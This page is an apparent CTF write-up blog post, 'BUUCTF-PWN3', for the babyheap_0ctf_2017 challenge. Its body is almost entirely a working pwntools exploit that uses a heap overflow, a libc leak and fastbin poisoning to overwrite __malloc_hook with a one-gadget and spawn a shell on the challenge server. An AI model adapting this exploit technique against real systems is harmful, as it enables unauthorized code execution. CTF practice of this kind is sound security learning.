@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="babyheap_0ctf_2017">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-PWN3">
+<meta property="og:url" content="http://kelpie.top/post/[BUUCTF]%20PWN3.html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="babyheap_0ctf_2017">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjG4h2KldlkxsEPVzL8eIl-RSVPK.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fqz6kZcejFDoOLalt-d2UXCidw7S.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuQBAPHvvl-eIERzwK15NP2vO07b.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhYBI9bJCCeWdpcwGmu_k1riQk7F.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhs6iNE-8fCZVLLrnxV1Qj-V9l5i.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrHuQtKuKatqSzwPUE6mMDf_j8YC.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FopV0b4yExnNA9Q0G7bl4OsOpLz8.png">
+<meta property="article:published_time" content="2022-09-14T22:19:33.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:12.702Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="BUUCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjG4h2KldlkxsEPVzL8eIl-RSVPK.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-PWN3</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/NEW_STAR%20Week1.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Computer%20Networking%20Application%20Layer.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/[BUUCTF]%20PWN3.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&text=BUUCTF-PWN3"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&is_video=false&description=BUUCTF-PWN3"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-PWN3&body=Check out this article: http://kelpie.top/post/[BUUCTF]%20PWN3.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&name=BUUCTF-PWN3&description=&lt;h2 id=&#34;babyheap-0ctf-2017&#34;&gt;&lt;a href=&#34;#babyheap-0ctf-2017&#34; class=&#34;headerlink&#34; title=&#34;babyheap_0ctf_2017&#34;&gt;&lt;/a&gt;babyheap_0ctf_2017&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjG4h2KldlkxsEPVzL8eIl-RSVPK.png&#34;&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/[BUUCTF]%20PWN3.html&t=BUUCTF-PWN3"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap-0ctf-2017"><span class="toc-number">1.</span> <span class="toc-text">babyheap_0ctf_2017</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        BUUCTF-PWN3
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-14T22:19:33.000Z" class="dt-published" itemprop="datePublished">2022-09-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/BUUCTF/" rel="tag">BUUCTF</a>, <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjG4h2KldlkxsEPVzL8eIl-RSVPK.png"></p>
+<span id="more"></span>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fqz6kZcejFDoOLalt-d2UXCidw7S.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuQBAPHvvl-eIERzwK15NP2vO07b.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhYBI9bJCCeWdpcwGmu_k1riQk7F.png"></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhs6iNE-8fCZVLLrnxV1Qj-V9l5i.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrHuQtKuKatqSzwPUE6mMDf_j8YC.png"></p>
+<p>After alloc(0x80)<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FopV0b4yExnNA9Q0G7bl4OsOpLz8.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+DEBUG <span class="token operator">=</span> <span class="token number">1</span>
+
+<span class="token keyword">if</span> DEBUG<span class="token punctuation">:</span>
+    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/home/kelpie/Desktop/CTF/buuctf/pwn28/ld-2.23.so'</span><span class="token punctuation">,</span><span class="token string">'./pwn28'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">'/home/kelpie/Desktop/CTF/buuctf/pwn28/libc-2.23-64.so'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26119</span><span class="token punctuation">)</span>
+
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23-64.so'</span><span class="token punctuation">)</span>
+
+padding <span class="token operator">=</span> <span class="token string">b'A'</span>
+
+<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">,</span><span class="token string">b'4'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
+    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+alloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># 3</span>
+
+
+free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>padding<span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
+    overflow the chunk 0
+    fill with data by padding * 0x80
+    fill with chunk 1 pre_size by padding * 0x8
+    fill with chunk 1 size by p64(0x120+1)
+    1 is in_use bit
+'''</span>
+
+
+alloc<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span>
+fill<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>padding<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+malloc_hook_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x58</span><span class="token operator">-</span><span class="token number">0x10</span>
+
+
+
+libc_base <span class="token operator">=</span> malloc_hook_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
+execve_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span>
+info<span class="token punctuation">(</span><span class="token string">"malloc_hook_addr: %s"</span> <span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+info<span class="token punctuation">(</span><span class="token string">"libc_base: %s"</span> <span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+info<span class="token punctuation">(</span><span class="token string">"execve: %s"</span> <span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+alloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment">#2</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#4</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#5</span>
+free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+
+fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>padding<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook_addr <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#5</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#6</span>
+
+fill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> padding<span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+alloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap-0ctf-2017"><span class="toc-number">1.</span> <span class="toc-text">babyheap_0ctf_2017</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/[BUUCTF]%20PWN3.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&text=BUUCTF-PWN3"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&is_video=false&description=BUUCTF-PWN3"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-PWN3&body=Check out this article: http://kelpie.top/post/[BUUCTF]%20PWN3.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&title=BUUCTF-PWN3"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/[BUUCTF]%20PWN3.html&name=BUUCTF-PWN3&description=&lt;h2 id=&#34;babyheap-0ctf-2017&#34;&gt;&lt;a href=&#34;#babyheap-0ctf-2017&#34; class=&#34;headerlink&#34; title=&#34;babyheap_0ctf_2017&#34;&gt;&lt;/a&gt;babyheap_0ctf_2017&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjG4h2KldlkxsEPVzL8eIl-RSVPK.png&#34;&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/[BUUCTF]%20PWN3.html&t=BUUCTF-PWN3"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
